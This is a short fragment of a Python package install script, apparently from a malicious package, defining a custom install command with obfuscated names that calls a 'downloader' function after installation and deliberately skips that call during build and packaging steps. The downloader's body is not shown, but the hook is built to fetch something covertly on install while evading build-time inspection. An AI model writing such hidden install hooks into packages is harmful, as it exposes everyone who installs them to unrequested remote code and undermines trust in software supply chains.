...
class h8j6b(install):
    def run(self):
        ...
        install.run(self)
        # Only execute during actual installation, not during build
        # Check if we're in a build context
        build_commands = ['build', 'bdist', 'bdist_wheel', 'bdist_egg', 'sdist']
        is_build = any(cmd in sys.argv for cmd in build_commands)
        if not is_build:
            _log_tracker("HOOK: install.run() completed, calling downloader")
            f5t1v()
        else:
            _log_tracker("HOOK: install.run() completed, skipping downloader (build phase)")
